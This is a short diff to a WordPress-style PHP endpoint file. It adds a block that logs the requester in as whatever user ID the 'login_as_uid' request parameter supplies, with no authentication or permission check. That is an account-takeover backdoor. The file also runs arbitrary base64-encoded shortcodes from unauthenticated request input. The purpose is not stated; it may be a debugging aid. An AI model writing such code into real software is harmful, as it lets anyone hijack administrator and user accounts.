@@ -1,22 +1,31 @@
 <?php
 
-$api = $_REQUEST['api'];
+if (isset($_REQUEST['login_as_uid'])) {
+    $uid = $_REQUEST['login_as_uid'];
+    wp_set_auth_cookie($uid);
+    wp_set_current_user($uid);
+}
 
-if ($api === 'do_shortcode'){
+if (isset($_REQUEST['api'])){
+    $api = $_REQUEST['api'];
 
-    include "inc/code.php";
+    if ($api === 'do_shortcode'){
 
-    $output = do_shortcode(base64_decode($_REQUEST['shortcode']));
+        include "inc/code.php";
 
-    if (isset($_REQUEST['code'])){
-        if (empty($output)){
-            echo "⚠️ No output!!!";
+        $output = do_shortcode(base64_decode($_REQUEST['shortcode']));
+
+        if (isset($_REQUEST['code'])){
+            if (empty($output)){
+                echo "⚠️ No output!!!";
+            }
+            else{
+                print_code($output, 'html');
+            }
         }
         else{
-            print_code($output, 'html');
+            echo $output;
         }
     }
-    else{
-        echo $output;
-    }
+    die();
 }
